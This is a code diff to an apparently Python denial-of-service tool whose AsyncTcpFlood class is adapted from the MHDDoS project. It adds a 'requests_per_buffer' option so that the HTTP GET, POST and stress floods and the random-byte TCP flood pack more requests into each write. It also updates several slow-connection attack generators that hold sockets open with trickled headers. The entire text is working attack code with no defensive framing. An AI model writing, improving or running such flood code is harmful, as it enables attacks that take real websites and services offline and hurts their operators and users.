@@ -140,6 +140,7 @@ class AttackSettings:
     high_watermark: int
     reader_limit: int
     socket_rcvbuf: int
+    requests_per_buffer: int = 1
 
     def with_options(self, **kwargs) -> "AttackSettings":
         settings = copy(self)
@@ -315,8 +316,12 @@ class AsyncTcpFlood:
         return await self._exec_proto(conn, on_connect, on_close)
 
     async def GET(self, on_connect=None) -> bool:
-        payload: bytes = self.build_request()
-        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
+        payload: bytes = self.build_request() * self._settings.requests_per_buffer
+        return await self._generic_flood_proto(
+            FloodSpecType.BUFFER,
+            (payload, self._settings.requests_per_buffer),
+            on_connect
+        )
 
     async def RGET(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
@@ -336,8 +341,12 @@ class AsyncTcpFlood:
                 "Content-Type: application/json\r\n"
             ),
             body='{"data": "%s"}' % Tools.rand_str(32)
+        ) * self._settings.requests_per_buffer
+        return await self._generic_flood_proto(
+            FloodSpecType.BUFFER,
+            (payload, self._settings.requests_per_buffer),
+            on_connect
         )
-        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def STRESS(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
@@ -348,8 +357,12 @@ class AsyncTcpFlood:
                 "Content-Type: application/json\r\n"
             ),
             body='{"data": "%s"}' % Tools.rand_str(512)
+        ) * self._settings.requests_per_buffer
+        return await self._generic_flood_proto(
+            FloodSpecType.BUFFER,
+            (payload, self._settings.requests_per_buffer),
+            on_connect
         )
-        return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def COOKIE(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
@@ -438,11 +451,11 @@ class AsyncTcpFlood:
         packet_size: int = len(packet)
 
         def _gen():
-            yield FloodOp.WRITE, (packet, packet_size)
+            yield FloodOp.WRITE, (packet, packet_size, 1)
             yield FloodOp.SLEEP, 5.01
             deadline = time.time() + 120
             for _ in range(self._settings.requests_per_connection):
-                yield FloodOp.WRITE, (packet, packet_size)
+                yield FloodOp.WRITE, (packet, packet_size, 1)
                 if time.time() > deadline:
                     return
 
@@ -454,7 +467,7 @@ class AsyncTcpFlood:
 
         def _gen():
             for _ in range(self._settings.requests_per_connection):
-                yield FloodOp.WRITE, (packet, packet_size)
+                yield FloodOp.WRITE, (packet, packet_size, 1)
                 # XXX: have to setup buffering properly for this attack to be effective
                 yield FloodOp.READ, 1
 
@@ -467,7 +480,7 @@ class AsyncTcpFlood:
         def _gen():
             for _ in range(self._settings.requests_per_connection):
                 yield FloodOp.SLEEP, 1
-                yield FloodOp.WRITE, (packet, packet_size)
+                yield FloodOp.WRITE, (packet, packet_size, 1)
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
 
@@ -477,15 +490,15 @@ class AsyncTcpFlood:
 
         def _gen():
             for _ in range(self._settings.requests_per_connection):
-                yield FloodOp.WRITE, (packet, packet_size)
+                yield FloodOp.WRITE, (packet, packet_size, 1)
             while True:
-                yield FloodOp.WRITE, (packet, packet_size)
+                yield FloodOp.WRITE, (packet, packet_size, 1)
                 yield FloodOp.READ, 1
                 # XXX: note this weid break in the middle of the code:
                 #        https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L1072
                 #      this attack has to be re-tested
                 keep = str.encode("X-a: %d\r\n" % random.randint(1, 5000))
-                yield FloodOp.WRITE, (keep, len(keep))
+                yield FloodOp.WRITE, (keep, len(keep), 1)
                 yield FloodOp.SLEEP, 10
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
@@ -496,7 +509,7 @@ class AsyncTcpFlood:
 
         def _gen():
             for _ in range(self._settings.requests_per_connection):
-                yield FloodOp.WRITE, (packet, packet_size)
+                yield FloodOp.WRITE, (packet, packet_size, 1)
                 while True:
                     yield FloodOp.SLEEP, 0.1
                     yield FloodOp.READ, 1
@@ -506,13 +519,12 @@ class AsyncTcpFlood:
                     #      within range(_) loop. original code from MHDDOS seems to
                     #      be broken on the matter:
                     #         https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L910
-            yield FloodOp.WRITE, (b'0', 1)
+            yield FloodOp.WRITE, (b'0', 1, 1)
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
 
     async def TCP(self, on_connect=None) -> bool:
-        self._settings = self._settings.with_options(high_watermark=1024 << 2)
-        packet_size = 1024
+        packet_size = 1024 * self._settings.requests_per_buffer
         return await self._generic_flood_proto(
             FloodSpecType.CALLABLE,
             partial(randbytes, packet_size),
@@ -570,9 +582,9 @@ class AsyncTcpFlood:
         p1_size, p2_size = len(p1), len(p2)
 
         def _gen():
-            yield FloodOp.WRITE, (p1, p1_size)
+            yield FloodOp.WRITE, (p1, p1_size, 1)
             for _ in range(self._settings.requests_per_connection):
-                yield FloodOp.WRITE, (p2, p2_size)
+                yield FloodOp.WRITE, (p2, p2_size, 1)
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
 
